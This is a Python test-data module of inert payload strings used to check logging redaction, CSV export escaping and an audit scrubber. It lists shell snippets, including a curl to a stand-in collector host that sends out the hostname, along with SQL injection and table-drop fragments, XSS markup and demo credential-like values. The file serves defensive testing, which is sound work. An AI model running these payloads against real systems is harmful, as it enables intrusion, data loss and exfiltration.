"""Payload strings used by the redaction and logging tests.

The strings below are test data, not code: they are the shapes scanners and
filters trip over (a shell command, a SQL fragment, a template that looks like
injected markup, credential-looking values). Tests import them to check that
logging redaction, CSV export escaping and the audit detail scrubber handle
hostile-looking input without mangling normal values.

Nothing here is executed or evaluated; keep it inert.
"""

from __future__ import annotations

SHELL_PAYLOADS = [
    "os.system('id')",
    "subprocess.check_output('whoami')",
    "`curl http://collector.example.test/$(cat /etc/hostname)`",
]

SQL_PAYLOADS = [
    "1' OR '1'='1",
    "BRP-1001'; DROP TABLE tickets; --",
    "subject LIKE '%' || (SELECT version()) || '%'",
]

MARKUP_PAYLOADS = [
    "<script>alert('xss')</script>",
    '<img src=x onerror="alert(1)">',
    "<svg/onload=alert(1)>",
]

CREDENTIAL_LOOKING_VALUES = [
    "DEMO-bpk-brp-admin-0001",
    "DEMO-whsec-brp-0001",
    "DEMO-session-secret-not-for-production",
    "Authorization: Bearer DEMO-bpk-tdw-agent-0001",
    "password=DEMO-tidalbrook-requester",
]

BASE64_LOOKING_BLOBS = [
    "QlVORExFX0JMT0JfREVNT19D",
    "VGhpcyBpcyBhIGRlbW8gZXhwb3J0IGZvciB0aGUgQmVsbHBvc3Qgd29ybGQ=",
]
